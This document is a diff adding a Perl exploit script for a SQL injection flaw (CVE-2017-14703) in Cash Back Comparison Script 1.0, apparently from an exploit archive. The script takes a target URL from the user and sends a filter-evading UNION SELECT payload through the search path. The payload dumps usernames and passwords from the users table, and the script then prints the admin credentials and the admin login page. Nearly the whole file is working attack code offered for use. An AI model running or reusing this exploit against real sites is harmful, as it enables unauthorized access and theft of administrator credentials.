@@ -1,0 +1,59 @@
+#!/usr/bin/perl -w
+# # # # # 
+# Exploit Title: Cash Back Comparison Script 1.0 - SQL Injection
+# Dork: N/A
+# Date: 22.09.2017
+# Vendor Homepage: http://cashbackcomparisonscript.com/
+# Software Link: http://cashbackcomparisonscript.com/demo/features/
+# Demo: http://www.cashbackcomparison.info/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-14703
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+sub clear{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear'); }
+clear();
+print "
+################################################################################
+                   #### ##     ##  ######     ###    ##    ## 
+                    ##  ##     ## ##    ##   ## ##   ###   ## 
+                    ##  ##     ## ##        ##   ##  ####  ## 
+                    ##  #########  ######  ##     ## ## ## ## 
+                    ##  ##     ##       ## ######### ##  #### 
+                    ##  ##     ## ##    ## ##     ## ##   ### 
+                   #### ##     ##  ######  ##     ## ##    ## 
+
+             ######  ######## ##    ##  ######     ###    ##    ## 
+            ##    ## ##       ###   ## ##    ##   ## ##   ###   ## 
+            ##       ##       ####  ## ##        ##   ##  ####  ## 
+             ######  ######   ## ## ## ##       ##     ## ## ## ## 
+                  ## ##       ##  #### ##       ######### ##  #### 
+            ##    ## ##       ##   ### ##    ## ##     ## ##   ### 
+             ######  ######## ##    ##  ######  ##     ## ##    ##                                                                            
+                 Cash Back Comparison Script 1.0 - SQL Injection           
+################################################################################
+";
+use LWP::UserAgent;
+print "\nInsert Target:[http://site.com/path/]: ";
+chomp(my $target=<STDIN>);
+print "\n[!] Exploiting Progress.....\n";
+print "\n";
+$cc="/*!01116concat*/(0x3c74657874617265613e,0x557365726e616d653a,username,0x20,0x506173733a,password,0x3c2f74657874617265613e)";
+$tt="users";
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0');
+$host = $target . "search/EfE'+/*!01116UNIoN*/+/*!01116SeLecT*/+0x31,0x32,0x33,0x34,0x35,0x36,".$cc.",0x38/*!50000FrOm*/".$tt."--+-.html";
+$res = $b->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content; if ($answer =~/<textarea>(.*?)<\/textarea>/){
+print "[+] Success !!!\n";
+print "\n[+] Admin Detail : $1\n";
+print "\n[+]$target/admin/login.php\n";
+print "\n";
+}
+else{print "\n[-]Not found.\n";
+}
